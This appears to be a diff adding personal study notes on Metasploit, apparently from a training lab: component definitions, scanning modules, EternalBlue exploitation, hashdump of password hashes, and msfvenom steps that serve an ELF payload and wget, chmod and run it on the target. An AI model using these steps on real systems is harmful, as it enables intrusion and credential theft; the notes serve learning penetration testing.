@@ -1,0 +1,71 @@
+Metasploit - 2 versions
+1. Metasploit Pro - commercial version
+2. Metasploit Framework - open source version
+
+main components of Metasploit framework:
+1. msfconsole - main command line interface
+2. Modules - supporting modules such as exploits, scanners, payloads etc
+3. Tools - Standalone tools that will help vulnerability research, assessment or peneration testing.
+
+
+
+Exploit - piece of code that uses a vulnerability present on the target system
+Vulnerability - Design or coding or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system
+Payload - An exploit will take advantage of a vulnerability. Paylaods are the code that will run on the target system
+
+
+Auxiliary - any supporting module, such as scanners, crawlers and fuzzers can be found in "auziliary" folder
+
+Encoders - programs to encode the exploit and payload
+
+Evasion -  evade AV softwares
+
+Exploits - programs with proof of concept that takes advantage of vulnerability in a system
+
+NOPs - No OPeration - do nothing, they are represented in the Intel x86 CPU family with x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes
+
+
+Payloads - there are 4 different categories
+1. Adapters - An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
+2. Singles - self contained paylaods that do not need to download an additional component to run
+3. Stagers - Responsible for setting up a connection channel between Metasploit and the target system. These will first upload a stager on the target system then download the rest of the payload 
+4. Stages - downloaded by the stager, this will allow attacker to use larger sized payloads
+
+
+===
+Metasploit Exploitation
+
+== Scanning
+1. search portscan -> set options -> run
+2. search smb_version -> set options -> run
+3. search http_version -> set options -> run
+4. search smb_login -> set options -> run
+
+
+
+== Metasploit Database
+
+== Vulnerability Scanning
+
+== Exploitation
+Expliot system using Eternal Blue vulnearbility
+search -f flag.txt
+
+cat <filePath>
+
+hashdump -> find pirate user password hash
+
+
+
+== MsfVenom
+execute the command
+msfvenom -p <payload> -f elf <optionName>=<optionValue> > shell.elf
+
+run python server in local machine
+python -m http.server 9009
+
+in the remote machine do wget to download this shell.elf file
+wget http://<ip>/shell.elf
+
+chmod +x shell.elf on remote machine
+./shell.elf on remote machine
